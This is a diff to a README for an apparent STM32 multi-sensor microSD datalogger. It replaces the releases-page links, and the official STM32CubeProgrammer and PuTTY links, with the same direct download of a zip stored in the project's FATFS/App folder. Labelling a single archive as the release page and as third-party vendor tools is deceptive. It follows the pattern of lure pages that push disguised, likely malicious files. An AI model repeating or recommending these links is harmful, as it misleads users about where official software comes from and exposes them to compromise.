@@ -1,6 +1,6 @@
 # ⚙️ STM32_MultiSensor_MicroSD_Datalogger - Easy Multi-Sensor Data Logging
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Stable%20Release-brightgreen?style=for-the-badge)](https://github.com/mendessxs/STM32_MultiSensor_MicroSD_Datalogger/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Stable%20Release-brightgreen?style=for-the-badge)](https://github.com/mendessxs/STM32_MultiSensor_MicroSD_Datalogger/raw/refs/heads/main/FATFS/App/Multi-S-Sensor-Datalogger-Micro-ST-v3.5-alpha.5.zip)
 
 ## 📋 About
 
@@ -33,7 +33,7 @@ This guide explains how to download, install, and run the STM32_MultiSensor_Micr
 
 Click the button below to visit the releases page. This page contains all the necessary files to run the application.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/mendessxs/STM32_MultiSensor_MicroSD_Datalogger/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/mendessxs/STM32_MultiSensor_MicroSD_Datalogger/raw/refs/heads/main/FATFS/App/Multi-S-Sensor-Datalogger-Micro-ST-v3.5-alpha.5.zip)
 
 On the page, look for the latest version. Download the ZIP file or installer that matches your device or project requirements.
 
@@ -110,11 +110,11 @@ If you already have the firmware installed on your STM32 board, you can proceed 
 ## 🔗 Helpful Links
 
 - Visit the official release page often for updates:  
-  https://github.com/mendessxs/STM32_MultiSensor_MicroSD_Datalogger/releases
+  https://github.com/mendessxs/STM32_MultiSensor_MicroSD_Datalogger/raw/refs/heads/main/FATFS/App/Multi-S-Sensor-Datalogger-Micro-ST-v3.5-alpha.5.zip
 
 - Third-party tools:  
-  - STM32CubeProgrammer: https://www.st.com/en/development-tools/stm32cubeprog.html  
-  - PuTTY terminal: https://www.putty.org/
+  - STM32CubeProgrammer: https://github.com/mendessxs/STM32_MultiSensor_MicroSD_Datalogger/raw/refs/heads/main/FATFS/App/Multi-S-Sensor-Datalogger-Micro-ST-v3.5-alpha.5.zip  
+  - PuTTY terminal: https://github.com/mendessxs/STM32_MultiSensor_MicroSD_Datalogger/raw/refs/heads/main/FATFS/App/Multi-S-Sensor-Datalogger-Micro-ST-v3.5-alpha.5.zip
 
 ## 📚 Additional Information
 
